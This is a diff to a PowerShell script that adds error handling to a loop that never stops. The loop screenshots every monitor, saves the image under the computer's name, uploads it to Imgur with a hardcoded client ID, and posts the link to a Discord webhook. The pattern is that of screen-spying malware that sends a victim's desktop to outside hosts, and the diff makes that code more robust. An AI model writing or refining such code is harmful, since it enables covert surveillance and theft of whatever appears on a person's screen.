@@ -5,22 +5,30 @@ function Capture-Screenshot {
 
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-    $screens = [System.Windows.Forms.Screen]::AllScreens
+    try {
+        $screens = [System.Windows.Forms.Screen]::AllScreens
 
-    $top    = ($screens | ForEach-Object { $_.Bounds.Top }    | Measure-Object -Minimum).Minimum
-    $left   = ($screens | ForEach-Object { $_.Bounds.Left }   | Measure-Object -Minimum).Minimum
-    $width  = ($screens | ForEach-Object { $_.Bounds.Right }  | Measure-Object -Maximum).Maximum
-    $height = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum
+        $top    = ($screens | ForEach-Object { $_.Bounds.Top }    | Measure-Object -Minimum).Minimum
+        $left   = ($screens | ForEach-Object { $_.Bounds.Left }   | Measure-Object -Minimum).Minimum
+        $width  = ($screens | ForEach-Object { $_.Bounds.Right }  | Measure-Object -Maximum).Maximum
+        $height = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum
 
-    $bounds   = [System.Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.Width), ([int]$bounds.Height)
-    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+        $bounds   = [System.Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.Width), ([int]$bounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
 
-    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
 
-    $bmp.Save($OutputFilePath)
-    $graphics.Dispose()
-    $bmp.Dispose()
+        $bmp.Save($OutputFilePath)
+        Write-Host "Screenshot captured and saved at: $OutputFilePath"
+    }
+    catch {
+        Write-Host "Error occurred while capturing screenshot: $_"
+    }
+    finally {
+        if ($graphics) { $graphics.Dispose() }
+        if ($bmp) { $bmp.Dispose() }
+    }
 }
 
 function Upload-ToImgur {
@@ -43,7 +51,7 @@ function Upload-ToImgur {
         return $imageUrl
     }
     catch {
-        Write-Host "Error occurred: $_"
+        Write-Host "Error occurred while uploading image to Imgur: $_"
         return $null
     }
 }
@@ -76,7 +84,7 @@ function Send-DiscordMessage {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
     }
     catch {
-        Write-Host "Error occurred: $_"
+        Write-Host "Error occurred while sending Discord message: $_"
     }
 }
 
@@ -86,7 +94,6 @@ $imgurClientId = "ffd17df3bb7faec"
 while ($true) {
     $outputFilePath = "$env:temp\$env:computername-Capture.png"
     Capture-Screenshot -OutputFilePath $outputFilePath
-    Write-Host "Screenshot captured and saved at: $outputFilePath"
     
     $imageUrl = Upload-ToImgur -ImageFilePath $outputFilePath -ClientId $imgurClientId
     if ($imageUrl) {
